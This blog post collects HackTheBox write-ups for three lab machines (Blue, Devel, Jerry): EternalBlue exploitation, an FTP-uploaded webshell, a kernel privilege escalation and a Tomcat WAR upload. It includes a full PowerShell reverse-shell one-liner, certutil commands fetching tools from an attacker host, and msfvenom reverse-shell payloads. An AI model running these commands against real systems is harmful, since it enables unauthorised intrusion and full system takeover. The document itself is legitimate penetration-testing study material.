+++
title = "HTB Round-Up (Part 1): Blue, Devel, Jerry -- Write-Ups"
description = "Walkthrough write-up of the Blue, Devel, and Jerry HackTheBox CTFs"
type = ["posts","post"]
tags = [
    "EternalBlue",
    "ms17-010",
    "certutil",
    "ftp",
    "powershell",
    "windows-exploit-suggester",
    "apache",
    "tomcat",
]
date = "2022-10-25T13:15:00"
categories = [
    "ctf",
    "HackTheBox",
    "TJNull List"
]
[ author ]
  name = "Rob"
+++

## About 
Instead of a single box write-up, I am including walkthroughs for three *easy* rated, retired Windows HackTheBox machines here to kick off my pursuit of completing the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The [recently updated](https://twitter.com/TJ_Null/status/1580174678555230209) list can be found [here](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing). Due to the simplicity of the machines, these writeups presented with concision in mind, unlike the majority of my other walkthroughs.
<br/><br/>
**Note:** I have replaced all instances of the virtual machines' ip addresses with `<target-ip>` throughout this write-up.

## Blue
Rooting this box involves the discovery and exploitation of the EternalBlue SMBv1 vulnerability. For more information on EternalBlue, see [this explanation on Avast.com](https://www.avast.com/c-eternalblue). In this write-up, I present methods for exploitation using, and not using, Metasploit.

### Enumeration
#### nmap
Enumeration is accomplished quickly and easily with nmap. After finding the machine's SMB service active and listening on ports 135/445, we can use nmap's `smb-vuln-ms17-010` script to identify the vulnerability. For more information on the script, [click here](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html).

```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

### Exploitation
#### With Metasploit
To conduct the exploitation of EternalBlue with Metasploit, we use the `windows/smb/ms17_010_eternalblue` module. After setting the necessary options, we run the exploit in `check` mode and look for sucess messages to confirm that the exploit was effective. If not, we will have somewhere to start when working to fix any problems.

```
[*] <target-ip>:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <target-ip>:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
...
[+] <target-ip>:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
...
[*] Meterpreter session 1 opened (<target-ip>:4444 -> <target-ip>:49158) at 2022-08-09 12:14:32 -0400
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

We are then left with a meterpreter shell session as `NT Authority\SYSTEM`:
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Without Metasploit
To effect this exploit without the use of Metasploit, we instead use `searchsploit` to look through the ExploitDB database for relevant exploits. Luckily, there are a plethora of options to choose from:

```
---------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'Ete | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS1 | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Cod | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'Eternal | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB  | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' S | windows_x86-64/remote/41987.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
For our purposes, we grab `42315.py` and copy it to our current working directory with `searchsploit -m 42315`. When we attempt to run the exploit, we're given a missing Python module error `No module named 'mysmb'`, is it isn't yet installed on our system. Luckily, we spy a link in the source code to an Offensive Security GitHub repository where we can find it.

```
EDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
```

After downloading the necessary module, running the exploit returns:
```
Target OS: Windows 7 Professional 7601 Service Pack 1
Not found accessible named pipe
Done
```

As the script, by default, tries all standard named pipes, this appears to be a permissions issue. Let's try  to have the script connect as `guest`, a `BUILTIN` default account. To do this, we edit the following lines of our exploit:
```
USERNAME = 'guest'
PASSWORD = ''
```

When we attempt to run the exploit again, we see that the exploit has successfully run:
```
...
creating file c:\pwned.txt on the target
...
```

Now, we simply need to change the script (lines ~928-930) to uncomment the commands for executing a reverse shell:
```
#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')

#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
```

Then we create our reverse shell executable with msfvenom:
```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=<target-ip> LPORT=4321 > NotAnExploit.exe
```

Here is our new script text:
```
smb_send_file(smbConn, 'NotAnExploit.exe', 'C', '/NotAnExploit.exe')
service_exec(conn, r'cmd /c C:\NotAnExploit.exe')
```

With this completed, we should get a reverse shell back when running the exploit!

## Devel
Completing this box involves FTP and web server exploitation, paired with a flexible privilege escalation portion, which allows for a variety of vectors to be utilized. As this machine is old (2050 days older at the time of publication!) and I need practice with kernel exploits, I've chosen this route.

### Enumeration

#### nmap
```
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
```

```
Matched Pattern: Powered-By: ASP.NET

Identified HTTP Server: Microsoft-IIS/7.5
```

Our scans return two basic services with ports open: FTP on port 21 and an IIS webserver on port 80. 

#### FTP
While the webserer only appears to contain default content, we discover that we can log in to the FTP server anonymously with `ftp anonymous@10.10.10.5`. Not only that, but we find that we have permission to upload files to the server with the `put` command. After conducting a few tests with generic image and HTTP files, we discover that the uploaded content can be accessed via the webserver on port 80.

Thus, we upload an Active Server Pages (`.aspx` - a format designed for .NET) webshell to the server. By passing commands through the relevant parameter in our requests, we discover that we have command execution on the machine as the `iis apppool\web` user. We also determine the following about the system:

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```


### Foothold - Reverse Shell 
In addition to enumerating our current user with `whoami`, we are able to use the `ping` command to verify that our attacking machine is reachable from the server. While we could transfer a netcat binary to the machine to generate a callback, this is an older machine and, thus, it may be easier to connect via PowerShell. With a bit of experimentation, we manage to do just that with the following shellcode:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',8889);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Privilege Escalation
From our PowerShell, we can do a bit more manual enumeration:
`whoami /priv`
```
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled
```

This is looking juicy. We then download and run WinPEAS for more information on the patches installed on this machine::

**Download WinPEAS** with CertUtil:
```
certutil -urlcache -split -f "http://<attacker-ip>:8000/winPEAS.bat" 
```

**WinPEAS output**
```
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
```

Alternatively, we can run the venerable [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) (ensuring that it is the original version, not NG) remotely to discover opportunities for obtaining root access.
<br/><br/>
**Note:** Like many, initially I had trouble getting the script to use the Microsoft Excel spreadsheet generated by the `xx` flag. This has to do with the use of the Python library `xlrd`, which can be mitigated via the use of Python virtual environments (`venv`). Alternatively, a quick fix is available [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50#issuecomment-1025764542).
<br/><br/>

**WES output**
```
python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2022-10-20-mmsb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

Honing our exploitation searches to "Build 7600" of Windows 7, which we gleaned from our initial enumeration efforts, brings us many options, including: ttps://www.exploit-db.com/download/40564.

Luckily for us, the text of the exploit explains concisely how to compile it for use:
```
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

After compiling the executable, we transfer it over to the machine with certutil to a writeable directory:
```
certutil -urlcache -split -f "http://<attacker-ip>:8000/MS11-046.exe" 
```

**Note:** At this juncture, I had to pass my reverse shell session to `cmd.exe`, as the necessary functionality was proving problematic with my initial PowerShell reverse shell.

With this completed, we simply execute the exploit and enjoy `SYSTEM` access!

```
C:\windows\temp>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

## Jerry
The third box of our initial roundup, Jerry features basic exploitation of an Apache Tomcat web server.

### Enumeration 
#### nmap
```
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88
```
Our initial scans give us a wealth of information about a Tomcat server running on port 8080 of the machine. Manually browsing to the webserver root futher confirms this:

`<target-ip>:8080`
```
Apache Tomcat/7.0.88
If you're seeing this, you've successfully installed Tomcat. Congratulations!
```

#### nikto
Despite its age, nikto can still often yield valuable information about web applications. Here, we get *very* lucky, with the following output:
```
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
```

Browsing to `<target-ip>:8080/manager` confirms this.

```
This site is asking you to sign in. 

Username:

Password:
```
### RCE - Administration Panel
Apache Tomcat is a common platform for deploying Java code. This means that we can use a malicious Web Application Resource (alternatively known as a Web Application Archive - `.war`) file to create a reverse shell callback to our machine.

First, we generate the necessary payload with msfvenom:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=8002 -f war > shell.war
Payload size: 1088 bytes
Final size of war file: 1088 bytes
```

Then we simply upload the `WAR` file:
![](/images/jerry/war.png)

...and run it for a reverse shell!

![](/images/jerry/tomcat-click.png)

Luckily, the Tomcat server was running as the Windows `SYSTEM` user, giving us full access immediately.

```
connect to [<attacker-ip>] from (UNKNOWN) [<target-ip>] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

## Lessons Learned
It's great to finally get a jump on the TJNull list, in pursuit of eventually obtaining the OSCP. I am attempting to document as many of the boxes on the list as I can, independent of their level of difficulty. 

* Blue
    * The process of manually exploiting EternalBlue was new to me, but will help with Metasploitless efforts going forward. 
    * Accounting for the actual use of named pipes helped to develop my understanding of their use both within the context of EB and more generally. 
* Devel
    * The machine's age rendered many of my previous go-to techniques and tools less helpful, mandating the use of a different approach.
    * Similarly, this gave me an opportunity to use `windows-exploit-suggester.py` and engage in the associated troubleshooting, mentioned above.
* Jerry
    * I have not needed to exploit an Apache Tomcat server in a while, so this was a great refresher in the use of `.war` (and `.jar`) files, generally.